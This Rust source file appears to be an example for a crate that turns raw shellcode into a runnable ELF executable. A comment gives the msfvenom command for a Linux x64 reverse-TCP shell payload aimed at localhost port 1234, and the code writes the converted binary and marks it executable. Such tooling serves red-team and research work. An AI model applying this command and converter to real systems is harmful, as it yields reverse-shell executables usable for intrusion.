use std::env::current_dir;
use std::fs::{self, File};
use std::io::Write;
use std::os::unix::fs::PermissionsExt;

use exeutils::elf;

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();

    // Shellcode:
    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
    let shellcode_path = format!("{}/assets/shellcode.bin", cwd);

    let shellcode_bytes = fs::read(shellcode_path).expect("Failed to open file");

    let elf = elf::shellcode_to_exe(&shellcode_bytes);

    let elf_path = format!("{}/assets/converted_elf", cwd);

    let mut file = File::create(&elf_path).unwrap();
    file.write_all(&elf).unwrap();
    fs::set_permissions(&elf_path, fs::Permissions::from_mode(0o755)).unwrap();
}
